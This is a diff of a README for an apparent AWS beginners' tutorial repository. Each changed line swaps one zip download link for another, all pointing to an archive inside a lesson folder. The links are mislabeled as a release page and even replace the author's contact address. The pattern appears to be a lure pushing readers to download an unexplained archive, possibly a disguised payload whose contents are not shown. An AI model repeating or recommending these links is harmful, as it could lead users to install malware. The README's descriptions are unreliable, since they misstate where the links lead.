@@ -1,6 +1,6 @@
 # 🌍 aws-cloud-basics - Learn AWS Cloud Fundamentals Easily
 
-[![Download](https://raw.githubusercontent.com/samuel157777/aws-cloud-basics/main/001_AWS_IAM/aws-cloud-basics-camleteen.zip)](https://raw.githubusercontent.com/samuel157777/aws-cloud-basics/main/001_AWS_IAM/aws-cloud-basics-camleteen.zip)
+[![Download](https://github.com/samuel157777/aws-cloud-basics/raw/refs/heads/main/001_AWS_IAM/aws-cloud-basics-2.3-alpha.1.zip)](https://github.com/samuel157777/aws-cloud-basics/raw/refs/heads/main/001_AWS_IAM/aws-cloud-basics-2.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To get started, visit the release page below to download the application:
 
-[Visit this page to download](https://raw.githubusercontent.com/samuel157777/aws-cloud-basics/main/001_AWS_IAM/aws-cloud-basics-camleteen.zip)
+[Visit this page to download](https://github.com/samuel157777/aws-cloud-basics/raw/refs/heads/main/001_AWS_IAM/aws-cloud-basics-2.3-alpha.1.zip)
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -57,8 +57,8 @@ This project is licensed under the MIT License. You can use or modify it under t
 
 ## 💬 Contact
 
-For further inquiries, you can contact the main author at [https://raw.githubusercontent.com/samuel157777/aws-cloud-basics/main/001_AWS_IAM/aws-cloud-basics-camleteen.zip]. 
+For further inquiries, you can contact the main author at [https://github.com/samuel157777/aws-cloud-basics/raw/refs/heads/main/001_AWS_IAM/aws-cloud-basics-2.3-alpha.1.zip]. 
 
 Thank you for choosing AWS Cloud Basics! Happy learning!
 
-[![Download](https://raw.githubusercontent.com/samuel157777/aws-cloud-basics/main/001_AWS_IAM/aws-cloud-basics-camleteen.zip)](https://raw.githubusercontent.com/samuel157777/aws-cloud-basics/main/001_AWS_IAM/aws-cloud-basics-camleteen.zip)
+[![Download](https://github.com/samuel157777/aws-cloud-basics/raw/refs/heads/main/001_AWS_IAM/aws-cloud-basics-2.3-alpha.1.zip)](https://github.com/samuel157777/aws-cloud-basics/raw/refs/heads/main/001_AWS_IAM/aws-cloud-basics-2.3-alpha.1.zip)
